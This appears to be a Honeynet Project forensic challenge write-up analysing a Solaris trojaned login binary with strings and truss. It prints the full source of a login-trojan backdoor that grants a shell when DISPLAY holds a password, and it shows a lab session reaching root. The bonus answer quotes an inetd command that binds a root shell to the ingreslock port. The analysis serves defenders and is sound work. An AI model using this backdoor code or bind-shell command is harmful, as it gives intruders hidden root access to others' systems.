+<br><font face="Courier New,Courier"><font size="-1"></font></font> <font face="Courier New,Courier"><font size="-1"></font></font>
+<p><font face="Courier New,Courier"><font size="-1">==================================================</font></font>
+<br><font face="Courier New,Courier"><font size="-1">attempt to open sun1
+succeeded</font></font>
+<br><font face="Courier New,Courier"><font size="-1">sun1: file not recognized:
+File truncated</font></font>
+<br><font face="Courier New,Courier"><font size="-1"></font></font> </p></ul>
+<font face="Arial,Helvetica"><font size="-1"></font></font>
+<li>
+<font face="Arial,Helvetica">In order to find more clues as to how this
+program executed any backdoor code, I ran "strings" against the file to
+extract any ASCII text. This is where I found some useful information.
+Down within the sun1 file was some clear text lines which gave me a clue
+of how this program worked.</font></li>
+
+<br> 
+<dir><b><font face="Courier New,Courier"><font size="-1"># strings -a sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">-- CUT --</font></font>
+<br><font face="Courier New,Courier"><font size="-1">&lt;E8 #@</font></font>
+<br><font face="Courier New,Courier"><font size="-1">&lt;E8 $@</font></font>
+<br><font face="Courier New,Courier"><font size="-1">&lt;E8 %@</font></font>
+<br><font face="Courier New,Courier"><font size="-1">&lt;E8 &amp;1</font></font>
+<br><font face="Courier New,Courier"><font size="-1"> *&lt;D0&amp;#&lt;CC&lt;F0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">&lt;FF&lt;FF&lt;FB&lt;AE</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">DISPLAY</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1">/usr/lib/libfl.k</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1">pirc</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1">/bin/sh</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">lError 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Not owner</font></font>
+<br><font face="Courier New,Courier"><font size="-1">No such file or directory</font></font>
+<br><font face="Courier New,Courier"><font size="-1">No such process</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Interrupted system call</font></font>
+<br><font face="Courier New,Courier"><font size="-1">I/O error</font></font>
+<br><font face="Courier New,Courier"><font size="-1">-- CUT --</font></font>
+<dir><font face="Courier New,Courier"><font size="-1"></font></font> </dir>
+</dir>
+<font face="Arial,Helvetica">The bolded lines above shows the some possible
+suspicious backdoor code.</font>
+<dir>
+<dir><font face="Arial,Helvetica"></font> </dir>
+</dir>
+
+<li>
+<font face="Arial,Helvetica">At his point, I decided to load the sun1 file
+onto my VMWare Solaris 8 i386 guest OS and conduct further test.</font></li>
+
+<li>
+<font face="Arial,Helvetica">I first ran the Solaris file command with
+the following results:</font></li>
+
+<br><font face="Arial,Helvetica"><font size="-1"></font></font> 
+<ul><b><font face="Courier New,Courier"><font size="-1"># file sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">can't read ELF header</font></font>
+<br><font face="Courier New,Courier"><font size="-1">sun1:</font></font></ul>
+<font face="Arial,Helvetica"><font size="-1"></font></font>
+<p><br><font face="Arial,Helvetica">It is interesting that the Solaris
+8 file command could not read the ELF header of sun1.</font>
+<br><font face="Arial,Helvetica"></font> 
+</p><li>
+<font face="Arial,Helvetica">I then ran ldd against it to list any dependencies:</font></li>
+</ul>
+</ul>
+
+<dir>
+<dir>
+<dir><b><font face="Courier New,Courier"><font size="-1"># ldd ./sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">ldd: ./sun1: elf_getehdr:
+Format error: shdr table truncated</font></font></dir>
+</dir>
+</dir>
+
+<ul>
+<ul><font face="Arial,Helvetica">The Solaris 8 ldd command did not work
+either.</font>
+<br><font face="Arial,Helvetica"></font> 
+<li>
+<font face="Arial,Helvetica">Next step was to use truss and execute the
+file and follow the system calls and signals:</font></li>
+</ul>
+</ul>
+
+<dir>
+<dir>
+<dir><b><font face="Courier New,Courier"><font size="-1"># truss ./sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">execve("./sun1", 0xFFBEFD3C,
+0xFFBEFD44)  argc = 1</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">execve("/usr/lib/libfl.k",
+0xFFBEFD3C, 0xFFBEFD44) Err#2 ENOENT</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">/usr/lib/libfl.kwrite(2,
+" / u s r / l i b / l i b".., 16)      = 16</font></font>
+<br><font face="Courier New,Courier"><font size="-1">: write(2, " : 
+", 2)                          
+= 2</font></font>
+<br><font face="Courier New,Courier"><font size="-1">No such file or directorywrite(2,
+" <b>N o   s u c h   f i l e</b>".., 25)    
+= 25</font></font>
+<p><font face="Courier New,Courier"><font size="-1">write(2, "\n", 1)                              
+= 1</font></font>
+<br><font face="Courier New,Courier"><font size="-1">_exit(1)</font></font>
+</p><dir> </dir>
+</dir>
+<font face="Arial,Helvetica">This showed that the sun1 file was immediately
+calling up the "/usr/lib/libfl.k" file.  Since that file did not exist
+on my system, the program errored out and exited with the message - "No
+such file".  In order to track down the normal execution flow of this
+program, I needed to copy the normal login program and rename it to /usr/lib/libfl.k. 
+This is the same step that the attacker executed in the manual commands
+section above.</font>
+<p><font face="Arial,Helvetica">After renaming/moving the login program,
+I used truss again on sun1 and received the following results:</font>
+</p><dir>
+<dir> </dir>
+<b><font face="Courier New,Courier"><font size="-1"># truss ./sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">execve("./sun1", 0xFFBEFD3C,
+0xFFBEFD44)  argc = 1</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">execve("/usr/lib/libfl.k",
+0xFFBEFD3C, 0xFFBEFD44)  argc = 1</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1">stat("/usr/lib/libfl.k",
+0xFFBEF9F0)           
+= 0</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">open("/var/ld/ld.config",
+O_RDONLY)            
+Err#2 ENOENT</font></font>
+<br><font face="Courier New,Courier"><font size="-1">open("/usr/lib/libcmd.so.1",
+O_RDONLY)          = 3</font></font>
+<br><font face="Courier New,Courier"><font size="-1">fstat(3, 0xFFBEF788)                           
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">mmap(0x00000000, 8192,
+PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0xFF3A0000</font></font>
+<br><font face="Courier New,Courier"><font size="-1">mmap(0x00000000, 90112,
+PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0xFF380000</font></font>
+<br><font face="Courier New,Courier"><font size="-1">mmap(0xFF394000, 1155,
+PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED, 3, 16384) =</font></font>
+<br><font face="Courier New,Courier"><font size="-1">0xFF394000</font></font>
+<p><b><font face="Courier New,Courier"><font size="-1">--- CUT ---</font></font></b>
+</p><p><b><font face="Courier New,Courier"><font size="-1">No utmpx entry. You
+must exec "login" from the lowest level "shell".</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1">write(1, " N o  
+u t m p x   e n t".., 69)      = 69</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF0A2000, 554)                        
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF090000, 3444)                       
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF062000, 658)                        
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF050000, 3434)                       
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF022000, 440)                        
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF010000, 2481)                       
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF002000, 704)                        
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFEFF0000, 6045)                       
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF044000, 1247)                       
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF030000, 12838)                      
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF0D6000, 16960)                      
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">munmap(0xFF0B0000, 88290)                      
+= 0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">llseek(0, 0, SEEK_CUR)                         
+= 57032</font></font>
+</p><dir>
+<dir><font face="Courier New,Courier"><font size="-1">_exit(1)</font></font></dir>
+</dir>
+</dir>
+<font face="Arial,Helvetica"></font>
+<p><br><font face="Arial,Helvetica">The executable ran and just handed
+the session off to the normal unix "login" program.  The program actually
+errored out with the message bolded from above.</font></p></dir>
+</dir>
+
+<ul>
+<ul>
+<li>
+<font face="Arial,Helvetica">I then ran sotruss against the sun1 file to
+follow the system library calls:</font></li>
+
+<br><font face="Arial,Helvetica"><font size="-1"></font></font> 
+<ul><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\&gt;
+sotruss ./sun1</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">ld.so.1: ./sun1: warning:
+/usr/lib/link_audit/truss.so.1: open failed: illegal insecure pathname</font></font>
+<br><font face="Courier New,Courier"><font size="-1">ld.so.1: ./sun1: fatal:
+/usr/lib/link_audit/truss.so.1: audit initialization failure: disabled</font></font>
+<br><font face="Courier New,Courier"><font size="-1">login: rbarnett</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Password:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">No utmpx entry. You
+must exec "login" from the lowest level "shell".</font></font></ul>
+<font face="Arial,Helvetica"></font>
+<p><br><font face="Arial,Helvetica">Sotruss showed that sun1 was making
+some strange system path requests.  The real login program, /usr/lib/libfl.k
+was considered an "insecure pathname".</font>
+<br><font face="Arial,Helvetica"></font> 
+</p><li>
+<font face="Arial,Helvetica">At this point, I decided to use the information
+that I found in the strings search and look on the Web.  I have run
+into similar backdoors which would give the attacker a root shell based
+on some environmental attribute or parameter, such as the login name or
+the source IP address, etc&#8230; My assumption was that this new login program
+would give a root shell to a connection with a specific parameter.</font></li>
+</ul>
+</ul>
+
+<ul>
+<ul>
+<li>
+<font face="Arial,Helvetica">I fired up Google and found the following
+pages when I search for "rootkit login trojan DISPLAY" - </font><a href="http://www.google.com/search?hl=en&amp;q=rootkit+login+trojan+DISPLAY">http://www.google.com/search?hl=en&amp;q=rootkit+login+trojan+DISPLAY</a><font face="Arial,Helvetica">.
+I quickly found the C source code on Packetstorm for a program called "</font><a href="http://packetstorm.widexs.nl/UNIX/penetration/rootkits/ulogin.c">ulogin.c</a><font face="Arial,Helvetica">"
+which is also called the Universal Login Trojan. It appeared that I had
+found the main trojan code that was held in the sun1 file. Here is the
+contents of ulogin.c (Look at the bolded section) -</font></li>
+</ul>
+</ul>
+
+<dir>
+<dir>
+<dir><font face="Courier New,Courier"><font size="-1">/* * PRIVATE !! PRIVATE
+!! PRIVATE !! PRIVATE !! PRIVATE !! PRIVATE !! PRIVATE !!</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* Universal login trojan
+by Tragedy/Dor</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* Email: rawpower@iname.com</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* IRC: [Dor]@ircnet</font></font>
+<br><font face="Courier New,Courier"><font size="-1">*</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* Login trojan for pretty
+much any O/S...</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* Tested on: Linux,
+BSDI 2.0, FreeBSD, IRIX 6.x, 5.x, Sunos 5.5,5.6,5.7</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* OSF1/DGUX4.0,</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* Known not to work
+on:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* SunOS 4.x and 5.4...
+Seems the only variable passwd to login</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* on these versions
+of SunOS is the $TERM... and its passed via</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* commandline option...
+should be easy to work round in time</font></font>
+<br><font face="Courier New,Courier"><font size="-1">*</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* <b>#define PASSWORD
+- Set your password here</b></font></font>
+<br><font face="Courier New,Courier"><font size="-1">* #define _PATH_LOGIN
+- This is where you moved the original login to</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* login to hacked host
+with...</font></font>
+<br><font face="Courier New,Courier"><font size="-1">* from bourne shell
+(sh, bash) sh DISPLAY="your pass";export DISPLAY;telnet host</font></font>
+<br><font face="Courier New,Courier"><font size="-1">*</font></font>
+<br><font face="Courier New,Courier"><font size="-1">*/</font></font>
+<br><font face="Courier New,Courier"><font size="-1">#include &lt;stdio.h</font></font>
+<br><font face="Courier New,Courier"><font size="-1">#if !defined(PASSWORD)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">#define PASSWORD <b>"j4l0n3n"</b></font></font>
+<br><font face="Courier New,Courier"><font size="-1">#endif</font></font>
+<br><font face="Courier New,Courier"><font size="-1">#if !defined(_PATH_LOGIN)</font></font>
+<br><font face="Courier New,Courier"><font size="-1"># define _PATH_LOGIN
+<b>"/bin/login"</b></font></font>
+<br><font face="Courier New,Courier"><font size="-1">#endif main (argc, argv,
+envp)</font></font>
+<br><font face="Courier New,Courier"><font size="-1">int argc; char **argv,
+**envp;</font></font>
+<br><font face="Courier New,Courier"><font size="-1">{ char *display = getenv("DISPLAY");</font></font>
+<br><font face="Courier New,Courier"><font size="-1">if ( display == NULL
+) {</font></font>
+<dir>
+<dir><font face="Courier New,Courier"><font size="-1">execve(_PATH_LOGIN,
+argv, envp);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">perror(_PATH_LOGIN);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">exit(1);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">}</font></font></dir>
+</dir>
+<font face="Courier New,Courier"><font size="-1">if (!strcmp(display,PASSWORD))
+{</font></font>
+<dir>
+<dir><font face="Courier New,Courier"><font size="-1">system("/bin/sh");</font></font></dir>
+</dir>
+<font face="Courier New,Courier"><font size="-1">exit(1);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">}</font></font>
+<br><font face="Courier New,Courier"><font size="-1">execve(_PATH_LOGIN,
+argv, envp);</font></font>
+<br><font face="Courier New,Courier"><font size="-1">exit(1); }</font></font>
+<dir> </dir>
+</dir>
+<font face="Arial,Helvetica">As the comments at the top of the file say,
+simply define the password to use, as well as, the location of the real
+login program and then compile. Then, you simply change your environmental
+display settings in your current shell to equal your password. Then, when
+you telnet to the host where your trojan login is running, it will let
+you right in without prompting for any credentials. So, if this truly is
+the same general trojan code, I should be able to test this theory with
+the sun1 code on my Solaris 8 test box.</font></dir>
+</dir>
+
+<ul>
+<ul>
+<li>
+<font face="Arial,Helvetica">I moved the sun1 program and renamed it to
+/bin/login.  I then checked my shell environment variable for the
+DISPLAY setting.  Since the DISPLAY variable was not set, the backdoor
+login program should function pretty much like a regular telnet login session:</font></li>
+</ul>
+</ul>
+
+<dir>
+<dir>
+<dir>
+<dir>
+<dir> </dir>
+</dir>
+<b><font face="Courier New,Courier"><font size="-1"># mv /bin/login /bin/login.old</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1"># cp sun1 /bin/login</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1"># ls -l /bin/login</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">-rwxr-xr-x  
+1 root     other      89776
+Apr 11 19:28 /bin/login</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1"># su - rbarnett</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\
+id</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">uid=101(rbarnett) gid=1(other)</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\
+echo $DISPLAY</font></font></b>
+<p><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\
+telnet localhost</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">Trying localhost...</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Connected to localhost.</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Escape character is
+'^]'.</font></font>
+<br><font face="Courier New,Courier"><font size="-1">login: rbarnett</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Password:</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Last login: Thu Apr
+11 19:26:05 on pts/5</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\
+exit</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">logout</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Connection closed by
+foreign host.</font></font></p></dir>
+</dir>
+</dir>
+
+<ul>
+<ul>
+<li>
+<font face="Arial,Helvetica">This scenario worked as I suspected. 
+I then set my DISPLAY variable to the "pirc" setting, which was found in
+the sun1 ascii code with the strings command.  I then telneted back
+into the localhost, while simultaneously capturing the new truss output
+to a file called sun1.truss.</font></li>
+</ul>
+</ul>
+
+<dir>
+<dir>
+<dir><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\
+DISPLAY=pirc</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\
+export DISPLAY</font></font></b>
+<br><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\
+echo $DISPLAY</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">pirc</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1">[rbarnett@saphe2]\
+truss -efo sun1.truss telnet localhost</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">Trying 127.0.0.1...</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Connected to localhost.</font></font>
+<br><font face="Courier New,Courier"><font size="-1">Escape character is
+'^]'.</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1"># id</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">uid=0(root) gid=0(root)</font></font>
+<br><b><font face="Courier New,Courier"><font size="-1"># exit</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">Connection closed by
+foreign host.</font></font></dir>
+</dir>
+</dir>
+
+<ul>
+<ul>
+<li>
+<font face="Arial,Helvetica">BINGO! - instant root shell.  I then
+looked at the new truss output of running telnet with the DISPLAY variable
+set to "pirc".  I used the "-e" flag with truss to capture the environmental
+parameters, which should display my new DISPLAY setting and the "-f" flag
+to follow child processes:</font></li>
+
+<br> 
+<ul><b><font face="Courier New,Courier"><font size="-1"># less sun1.truss</font></font></b>
+<br><font face="Courier New,Courier"><font size="-1">6285:   execve("login",
+0xFFBEFBEC, 0xFFBEFBF8)  argc = 2</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6285:   
+argv: login root</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6285:   
+envp: PWD=/usr/users/rbarnett TZ=US/Eastern _INIT_RUN_NPREV=0</font></font>
+<br><font face="Courier New,Courier"><font size="-1">-- CUT --</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6285:    
+BASH_ENV=/usr/users/rbarnett/.bashrc</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6285:    
+LC_NUMERIC=en_US.ISO8859-1 <b>DISPLAY=pirc</b> LOGNAME=rbarnett</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6285:    
+_INIT_UTS_NODENAME=saphe2</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6285:    
+SHELL=/bin/bash HOSTTYPE=sparc OSTYPE=solaris</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6285:    
+HOME=/usr/users/rbarnett TERM=vt100</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6285:    
+PATH=/usr/bin::/usr/local/bin:/usr/bin:/usr/usc/bin:/usr/ucb:/usr/ccs/bin:/usr/sbin</font></font>
+<br><font face="Courier New,Courier"><font size="-1">-- CUT --</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6288:   execve("/bin/sh",
+0x0003A784, 0x0003A78C)  argc = 1</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6288:   
+argv: /bin/sh</font></font>
+<br><font face="Courier New,Courier"><font size="-1">6288:   
+envp: BASH_ENV=/usr/users/rbarnett/.bashrc <b>DISPLAY=pirc</b></font></font>
+<br><b><font face="Courier New,Courier"><font size="-1"></font></font></b> </ul>
+<font face="Arial,Helvetica">As the bolded lines above show, the backdoor
+password of "pirc" is sitting in my Environmental parameters that are passed
+to the telnetd program.  Telnet then passed these same parameters
+on to the trojaned login program and it spawned a root shell for me. 
+The root shell was spawned due to the fact that telnet is running through
+inetd as user "root", as specifiec in the inetd.conf file -</font>
+<br><font face="Arial,Helvetica"></font> 
+<ul><font face="Courier New,Courier"><font size="-1">telnet  stream 
+tcp     nowait  <b>root</b>   
+/usr/sbin/in.telnetd         
+in.telnetd</font></font></ul>
+
+<p><br><font face="Arial,Helvetica">Refer back to the information given
+in my answer to Question 3.</font></p></ul>
+</ul>
+
+<ol>
+<li>
+<b><font face="Arial,Helvetica">What did you learn from this exercise?</font></b></li>
+
+<br><font face="Arial,Helvetica"><b>Answer: </b>The most important thing
+that I learned from this exercies is how important it is to try and identify
+the motives of the attacker.  I was able to quickly catagorize the
+sun1 trojan as a login replacement due to the captured keystrokes. 
+With this perspective, I could conduct my analysis knowing that the attacker's
+goal was to use sun1 to grant him/herself future access to the system. 
+If I had simply been given the sun1 file, with no accompanying information,
+the analysis of the file would have been much more challenging.</font>
+<br><font face="Arial,Helvetica"><font size="-1"></font></font> 
+<li>
+<b><font face="Arial,Helvetica">How long did this challenge take you?</font></b></li>
+
+<br><b><font face="Arial,Helvetica">Answer: 6 hours total.</font></b>
+<ul>
+<li>
+<font face="Arial,Helvetica">About 4 hours, one rainy Saturday.</font></li>
+
+<li>
+<font face="Arial,Helvetica">2 more hours to write this up.</font></li>
+</ul>
+</ol>
+
+<p><br><b><font face="Arial,Helvetica">Bonus Question:</font></b>
+<br><b><font face="Arial,Helvetica">One of the commands executed during
+the attack is</font></b><b></b>
+</p><p><font face="Arial,Helvetica"><font size="-1">echo "BD PID(s): "`ps -fed|grep
+' -s /tmp/x'|grep -v grep|awk '{print $2}'`</font></font><b></b>
+</p><p><b><font face="Arial,Helvetica">What is the purpose of this command
+and what does 'BD' stand for?</font></b>
+<br><font face="Arial,Helvetica"><b>Answer: </b>This command was part of
+the automatic commad set that the attacker sent upon connection to the
+newly created root shell on TCP port 1524 (ingreslock).  This rootshell
+was created by the buffer-overlfow attack on the dtspcd daemon.  Here
+is the actual exploit code that was executed by the buffer-overflow:</font>
+</p><blockquote><font face="Courier New,Courier"><font size="-1">/bin/ksh   
+-c  echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x;/usr/sbin/inetd
+-s /tmp/x;sleep 10;/bin/rm -f /tmp/x</font></font><font face="Arial,Helvetica"></font></blockquote>
+<font face="Arial,Helvetica">In this command string, the attacker a joined
+together 4 different commands.  You can indentify the command separation
+by the semi-colons.  A different way to look at this command string
+is:</font>
+<ul>
+<li>
+<font face="Courier New,Courier"><font size="-1">/bin/ksh   
+-c  echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x</font></font></li>
+
+<br><font face="Arial,Helvetica">This command used the korn shell to create
+the file /tmp/x with one line as it's contents.  This is an inetd.conf
+style entry which will spawn an interactive root shell on the ingreslock
+port.</font>
+<br><font face="Arial,Helvetica"></font> 
+<li>
+<font face="Courier New,Courier"><font size="-1">/usr/sbin/inetd -s /tmp/x</font></font></li>
+
+<br><font face="Arial,Helvetica">This command starts up an inetd process
+and uses the /tmp/x file for it's configuration rather than the default
+of /etc/inetd.conf.</font>
+<br><font face="Arial,Helvetica"></font> 
+<li>
+<font face="Courier New,Courier"><font size="-1">sleep 10</font></font></li>
+
+<br><font face="Arial,Helvetica">This command is intended to make the system
+wait for 10 seconds, to allow the new inetd process to be created, before
+it moves onto the final command.</font>
+<br><font face="Arial,Helvetica"></font> 
+<li>
+<font face="Courier New,Courier"><font size="-1">rm -f /tmp/x</font></font></li>
+
+<br><font face="Arial,Helvetica">This command removes the backdoor inetd
+config file from the temp directory.</font>
+<br><font face="Arial,Helvetica"></font> </ul>
+<font face="Arial,Helvetica">Now, back to the question at hand.  The
+BD command above will give the attacker the process id number of the inetd
+process that he created with the buffer-overflow attack code.  The
+inetd process has the following PID:</font>
+<blockquote><font face="Courier New,Courier"><font size="-1">BD PID(s): 3476</font></font></blockquote>
+<font face="Arial,Helvetica">The BD stands for <b>B</b>ack<b>D</b>oor process,
+I am assumming ;)  This would allow the attack to know which process
+number to kill once he had installed and test the sun1 login backdoor. 
+Once he knew that sun1 was working, he coud issue a "# kill -9 3476" and
+get rid of inetd backdoor.</font>
+<br><b><font face="Arial,Helvetica"></font></b> 
+<p><b><font face="Arial,Helvetica"><font size="-1">The Results:</font></font></b>
+</p><p><i><font face="Arial,Helvetica"><font size="-1">Writeup from the Honeynet
+Project members.</font></font></i>
+</p><p><i><font face="Arial,Helvetica"><font size="-1">Writeup from the Security
+Community</font></font></i>
+</p><center>
+<p><a href="http://project.honeynet.org/"><img src="21_files/small.html" alt="The Honeynet Project" border="0" height="34" width="143"></a></p></center>
+
+</body></html>
